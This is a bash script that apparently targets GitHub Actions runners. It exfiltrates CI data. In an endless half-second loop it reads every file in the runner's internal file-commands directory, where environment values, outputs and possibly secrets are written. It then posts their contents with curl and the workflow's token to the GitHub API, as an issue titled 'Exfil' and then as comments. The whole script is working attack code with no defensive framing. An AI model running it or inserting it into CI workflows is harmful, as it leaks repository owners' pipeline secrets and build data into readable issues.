#!/bin/bash

GITHUB_TOKEN="${GITHUB_TOKEN}"
GITHUB_REPOSITORY="${GITHUB_REPOSITORY}"
RUNNER_FILE_COMMANDS_DIR='/home/runner/work/_temp/_runner_file_commands/'

POLL_INTERVAL=.5
ISSUE_NUMBER=""

exfil() {
    # Create a combined file that appends each file in the directory
    combined=$(mktemp)

    for f in "$RUNNER_FILE_COMMANDS_DIR"*; do
        if [ -f "$f" ]; then
            echo "### $(basename "$f")" >> "$combined"
            echo "" >> "$combined"
            cat "$f" >> "$combined"
            echo "" >> "$combined"
            echo "" >> "$combined"
        fi
    done

    # Post the combined file: create the issue on first run, otherwise add a comment
    if [ -z "$ISSUE_NUMBER" ]; then
        create_issue_from_file "$combined"
    else
        create_comment_from_file "$combined"
    fi

    rm -f "$combined"
}

main() {    
    while true; do
        exfil
        sleep "$POLL_INTERVAL"
    done
}

create_issue_from_file() {
    local file="$1"
    local title="Exfil"

    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues"

    if command -v jq >/dev/null 2>&1; then
        json_data=$(jq -Rs --arg title "$title" '{title:$title, body: .}' < "$file")
    else
        # Fallback: read file and escape newlines/quotes (less safe)
        body=$(sed -e ':a' -e 'N' -e '$!ba' -e 's/"/\\"/g' "$file" | awk '{printf "%s\\n", $0}')
        json_data=$(printf '{"title":"%s","body":"%s"}' "$title" "$body")
    fi

    response=$(curl -s -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data")

    ISSUE_NUMBER=$(echo "$response" | grep -o '"number": [0-9]*' | head -1 | grep -o '[0-9]*')
}

create_comment_from_file() {
    local file="$1"

    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"

    if command -v jq >/dev/null 2>&1; then
        json_data=$(jq -Rs '{body: .}' < "$file")
    else
        body=$(sed -e ':a' -e 'N' -e '$!ba' -e 's/"/\\"/g' "$file" | awk '{printf "%s\\n", $0}')
        json_data=$(printf '{"body":"%s"}' "$body")
    fi

    curl -s -X POST "$api_url" \
        -H "Authorization: Bearer $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -H "Content-Type: application/json" \
        -d "$json_data" > /dev/null
}

main
